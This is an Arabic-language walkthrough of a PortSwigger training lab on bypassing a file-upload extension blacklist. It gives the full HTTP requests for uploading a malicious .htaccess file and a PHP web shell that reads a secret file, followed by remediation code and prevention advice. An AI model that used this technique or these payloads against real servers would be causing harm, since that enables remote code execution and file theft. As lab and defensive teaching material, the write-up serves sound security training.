# Lab: Web shell upload via extension blacklist bypass

> **Category:** File Upload Vulnerabilities  
> **Difficulty:** PRACTITIONER  
> **Lab Link:** [PortSwigger Lab - Web shell upload via extension blacklist bypass](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)

---

## 🎯 الهدف الرئيسي

استغلال ثغرة رفع الملفات (File Upload) حيث توجد قائمة سوداء (blacklist) للامتدادات. يمكننا تجاوز هذه القائمة عن طريق رفع ملف `.htaccess` الذي يربط امتداداً جديداً (مثل `.l33t`) بـ `application/x-httpd-php`، ثم رفع Web Shell بالامتداد الجديد وتنفيذه.

**الحساب:** `wiener:peter`

**المطلوب:** الحصول على السر (secret) وإرساله.

---

## 📝 الحل خطوة بخطوة

### الخطوة 1: تسجيل الدخول وفهم القيود

- سجل الدخول بـ `wiener:peter`
- حاول رفع ملف `exploit.php` بالمحتوى:

```php
<?php echo file_get_contents('/home/carlos/secret'); ?>
```

**النتيجة:** يتم رفض الرفع (امتداد `.php` ممنوع)

### الخطوة 2: إنشاء ملف .htaccess

- أنشئ ملفاً باسم `.htaccess` بالمحتوى:

```
AddType application/x-httpd-php .l33t
```

هذا يخبر Apache بأن أي ملف ينتهي بـ `.l33t` يعامله كملف PHP.

### الخطوة 3: رفع ملف .htaccess

- في Burp، اعترض طلب `POST /my-account/avatar`
- غيّر `filename="exploit.php"` إلى `filename=".htaccess"`
- غيّر `Content-Type` إلى `text/plain`
- استبدل محتوى الملف بـ `AddType application/x-httpd-php .l33t`

**الطلب النهائي:**

```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="avatar"; filename=".htaccess"
Content-Type: text/plain

AddType application/x-httpd-php .l33t
--boundary--
```

- أرسل الطلب

**النتيجة:** تم رفع `.htaccess` بنجاح ✅

### الخطوة 4: رفع Web Shell بالامتداد الجديد

- عدّل الطلب الأصلي:
  - غيّر `filename="exploit.php"` إلى `filename="exploit.l33t"`
  - اترك محتوى PHP كما هو

**الطلب:**

```http
POST /my-account/avatar HTTP/1.1
Content-Type: multipart/form-data; boundary=...

--boundary
Content-Disposition: form-data; name="avatar"; filename="exploit.l33t"
Content-Type: application/x-php

<?php echo file_get_contents('/home/carlos/secret'); ?>
--boundary--
```

- أرسل الطلب

**النتيجة:** تم رفع الملف بنجاح ✅

### الخطوة 5: تنفيذ Web Shell

- في Repeater، أرسل طلب `GET` إلى:

```http
GET /files/avatars/exploit.l33t HTTP/1.1
Host: YOUR-LAB-ID.web-security-academy.net
```

**النتيجة:** يظهر السر (secret) في الرد ✅

### الخطوة 6: إرسال السر

- انسخ السر
- ارجع إلى صفحة المختبر
- اضغط **Submit solution** والصق السر

### الخطوة 7: حل المختبر

بعد إرسال السر الصحيح، سيتم حل المختبر ✅

---

## ملاحظات

| النقطة | الشرح |
|--------|-------|
| **ما هو ملف .htaccess؟** | ملف تكوين Apache يسمح بتغيير إعدادات الخادم لكل مجلد |
| **ماذا تفعل التوجيهة `AddType`؟** | تربط امتداداً معيناً بنوع MIME قابل للتنفيذ |
| **لماذا نجح هذا؟** | القائمة السوداء تمنع `.php` فقط، لكنها تسمح برفع `.htaccess` و `.l33t` |
| **كيف يعمل الهجوم؟** | `exploit.l33t` يتم معاملته كـ PHP بفضل `.htaccess` |

---

## 🛡️ Remediation & Source Code Fix

### 📌 Vulnerability Root Cause

1. استخدام القائمة السوداء (blacklist) بدلاً من القائمة البيضاء (whitelist)
2. السماح برفع ملف `.htaccess`
3. تمكين `mod_php` في المجلدات القابلة للرفع

---

### ❌ Non-Compliant Code (Apache Configuration)

```apache
# .htaccess الموجود على الخادم (افتراضي)
# خطأ: السماح بتحميل .htaccess
<FilesMatch "\.php$">
    Deny from all
</FilesMatch>

# خطأ: لا يمنع تحميل .htaccess
```

```javascript
// Backend (Next.js) - التحقق من الامتداد
const BLACKLIST = ['.php', '.phar', '.phtml'];

function isAllowed(filename) {
  const ext = path.extname(filename);
  // خطأ: استخدام blacklist (قائمة سوداء)
  return !BLACKLIST.includes(ext);
}
```

---

### ✅ Compliant Code (Configuration)

```apache
# إعدادات Apache - منع الوصول إلى .htaccess
<Files ".htaccess">
    Require all denied
</Files>

# أو منع رفع أي ملف يبدأ بنقطة
<FilesMatch "^\.">
    Require all denied
</FilesMatch>
```

```nginx
# إعدادات Nginx - منع الوصول إلى .htaccess وملفات التكوين
location ~ /\.ht {
    deny all;
}
```

```javascript
// Backend (Next.js) - استخدام whitelist بدلاً من blacklist
const WHITELIST = ['.jpg', '.jpeg', '.png', '.gif'];

function isAllowed(filename) {
  const ext = path.extname(filename).toLowerCase();
  // التصحيح: استخدام whitelist (قائمة بيضاء)
  return WHITELIST.includes(ext);
}

export default function uploadHandler(req, res) {
  const file = files.avatar;
  const filename = file.originalFilename;
  
  // التصحيح: التحقق من الامتداد بالقائمة البيضاء
  if (!isAllowed(filename)) {
    return res.status(400).json({ error: 'File type not allowed' });
  }
  
  // التصحيح: إعادة تسمية الملف
  const safeFilename = `${uuidv4()}${path.extname(filename)}`;
  // ... بقية المعالجة
}
```

**الخلاصة:** 
1. استخدم **القائمة البيضاء (whitelist)** بدلاً من القائمة السوداء
2. امنع رفع أي ملفات تكوين مثل `.htaccess`
3. أعد تسمية الملفات المرفوعة بأسماء عشوائية
4. خزّن الملفات خارج مجلد الويب القابل للتنفيذ

---

## 🛡️ كيفية الوقاية (How to Prevent)

| الإجراء | الوصف |
|---------|-------|
| **القائمة البيضاء (Whitelist)** | سمح فقط بالامتدادات الآمنة (`.jpg`, `.png`, `.gif`) |
| **منع ملفات التكوين** | امنع رفع `.htaccess`, `.ini`, `.yaml`, `.xml` |
| **إعادة تسمية الملف** | استخدم أسماء عشوائية (UUID) بدلاً من اسم المستخدم |
| **تخزين خارج webroot** | ضع الملفات خارج المجلد العام |
| **فحص المحتوى (Magic bytes)** | تأكد من أن الملف هو ما يدّعي أنه |
| **تعطيل `mod_php` في مجلد الرفع** | استخدم `php_flag engine off` في `.htaccess` الخاص بالخادم |

---

## 🔗 روابط مفيدة

- [PortSwigger Lab Page](https://portswigger.net/web-security/file-upload/lab-file-upload-web-shell-upload-via-extension-blacklist-bypass)
- [.htaccess File Security](https://httpd.apache.org/docs/current/howto/htaccess.html)
- [File Upload Cheat Sheet](https://portswigger.net/web-security/file-upload)
